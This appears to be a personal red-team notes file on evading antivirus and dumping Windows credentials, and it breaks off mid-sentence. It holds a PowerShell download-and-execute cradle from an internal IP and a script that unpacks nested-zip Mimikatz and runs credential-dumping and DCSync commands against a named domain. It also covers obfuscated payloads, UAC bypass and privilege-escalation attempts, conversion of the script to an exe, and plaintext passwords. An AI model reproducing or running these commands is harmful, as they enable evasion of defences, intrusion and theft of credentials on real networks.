# Aes encryption and Decryption of functions

```C#
shifted to aes_encryption.cs
```

# Shellcode loader for 

cn I load aes encypted shellcode from meterpreter into the thing

# trying to obfuscate powerview and mimikatz

https://www.cyberguider.com/bypassing-av-cat-vs-mouse/

Get-MpThreatDetection - this will list all the threats

pyobfuscation works with powerview

 https://github.com/CBHue/PyFuscation.

```
# python PyFuscation.py -fpv --ps powerup.ps1 
```

```
iex (New-Object Net.WebClient).DownloadString('http://10.10.6.12:8000/08012022_08_34_48.ps1');danger
```

a command to modify files in powershell
```
PS C:\> Get-Content D:\MultipleLineExamples.txt | Select -First 10 | Select -Last 1

get-content myfile.txt | select -first 1 -skip 9
```

# uncompressing mimikatz

```
Add-Type -AssemblyName System.IO.Compression.Filesystem
Add-Type -AssemblyName System.IO
$path = "Kitikat_2_2_1.zip"
$zipFile = Get-ChildItem $path -recurse -Filter "*.zip"
$rootArchive = [System.IO.Compression.zipfile]::OpenRead($zipFile.fullname)
$archivesLevel2 = New-object System.IO.Compression.ZipArchive ($rootArchive.Entries[0].Open())
$archivesLevel3 = New-object System.IO.Compression.ZipArchive ($archivesLevel2.Entries[0].Open())
$archivesLevel4 = New-object System.IO.Compression.ZipArchive ($archivesLevel3.Entries[0].Open())
$file =$archivesLevel4.Entries[0].Open()
$reader = New-Object IO.StreamReader($file)
$text = $reader.ReadToEnd()
iex $text
Hartford -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" "lsadump::dcsync"  "lsadump::dcsync /domain:ksew.com.pk /user:Administrator" "lsadump::dcsync /user:ksew.com.pk\krbtgt" "exit"' > take.txt
```



# converting powershell to exe

`Install-Module -Name ps2exe -RequiredVersion 1.0.10`
`Invoke-ps2exe .\unkitikat.ps1 .\bang.exe`




all done through sed

# fuzzy security

https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-Runas.ps1

invokerunas giving error

```
C:\Users\m\Downloads>powershell "import-module .\invoke_runas.ps1;Invoke-runas"

cmdlet Invoke-Runas at command pipeline position 1
Supply values for the following parameters:
User: WIN10RED
Password: WinR3d@
Binary: C:\Windows\System32\cmd.exe 
LogonType: 0x1

[>] Calling Advapi32::CreateProcessWithLogonW

[+] Success, process details:

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     18       4     1532       2252       0.02    400   1 cmd

```

can we pass with commands


-NoNewWindows start-process

can we again run the binary to get a new much more exploitable version of windows powershell?

This work :

```
C:\Users\m\Downloads>powershell "Start-Process C:\Windows\System32\cmd.exe -NoNewWindow"
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.
```

```
$pass = convertTo-SecureString 'password@123' -AsPlainText -Force;$name="m";$cred = New-Object System.Management.Automation.PSCredential($name,$pass);Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
```

UACbypass from here:

```
C:\Users\m\Downloads>powershell "import-module .\uace_bypass.ps1;Bypass-UAC -Method UacMethodSysprep"

[!] The current user is not part of the Administrator group!
```

otherway is to use https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

we can also create a exe that runs all the commands

using runas 

# working runas command

runas /user:HP "powershell Start-Transcript -Path C:\Users\m\testlog.txt;import-module 'C:\Users\m\invokemimi.ps1';Stop-Transcript"

Bypass-UAC -Method UacMethodTcmsetup

# using invoke-obfuscation

https://blog.geoda-security.com/2018/05/running-obfuscated-version-of-mimikatz.html

`Import-Module .\Invoke-obfuscation.psd1; Invoke-Obfuscation`

set a scriptblock

```
set ScriptBlock "sensationalism -Command coffee"
```
ENCODING > 5 (AES) > 

```
 ( [rUnTime.interOPseRvicEs.mARShAL]::PtRtoStRinGbStr( [RUNTIMe.intEroPSeRVIcEs.marsHal]::sECUrEsTringToBStR( $('76492d1116743f0423413b16050a5345MgB8AGcAdQB6AHMAaQBWAGcAMgB6AGIAegB2AE4AcABuADQAVwBBAFYAcgBRAHcAPQA9AHwANgAzAGEANABmADMAOQA1ADEANwAzADEAYgA3AGUAZQBkAGEAMgBiADMANAA1AGMANwBhAGYAYwBlAGEANAAyADAAMwA0AGMAMAAxADcAMQBmAGIAMgBhADMANQBlADcAMAA5ADcAZgAyADkAZgA2AGIAZQA0AGQAYQAzADMAYwA0ADMANwA1AGUAMwA1AGUAZgA2AGIAOQA3AGUANQAyAGIAZgAzAGEANQA0AGYAZABkAGYAMQBmADEANwBkADEAMwA1AGIAMgA1ADgAMABmADQAYwBmADIAMgBkAGUAYQA2AGYAMwBlADkAMAAyADAAYgA2AGQAMgA1AGMAMgA0AA==' |CoNVErttO-SecurestrinG  -Ke 8,235,214,3,211,95,255,197,77,221,129,59,109,255,134,188)) ) ) | &((GV '*MDr*').NAME[3,11,2]-JoIn'')
```

# meterpreter shell commands

sending to background - background

when trying with windows/shell_reverse_tcp - we got the response as :
